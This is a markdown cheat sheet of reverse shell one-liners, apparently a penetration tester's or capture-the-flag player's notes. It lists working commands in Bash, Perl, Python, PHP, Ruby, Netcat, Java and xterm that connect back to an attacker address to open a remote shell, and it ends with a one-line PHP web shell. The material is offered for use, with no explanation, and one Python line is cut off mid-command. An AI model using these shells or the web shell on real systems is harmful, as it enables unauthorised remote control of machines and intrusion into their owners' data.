# Shells (One-liners)

## Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
/bin/bash -i >& /dev/tcp/10.10.14.29/4444 0>&1

#as cmd in php shell
bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
```

## Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.29",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat
```
nc -e /bin/sh 10.0.0.1 1234
nc -e /bin/bash 10.0.0.1 1234

# if wrong version of netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## xterm

### Run following command on server and it will try to connect back to you (10.0.0.1) on TCP Port 6001
```
xterm -display 10.0.0.1:1
```

### To catch the incoming xterm, start an X-Server (:1 - which listens on TCP port 6001). To do this run the following Xnest command on your system:

```
Xnest :1
```

### You'll need to authorise the target to connect to you (command also run on your host):
```
xhost +targetip
```

## Simple PHP WebShell
```
<?php system($_GET['cmd']); ?>
```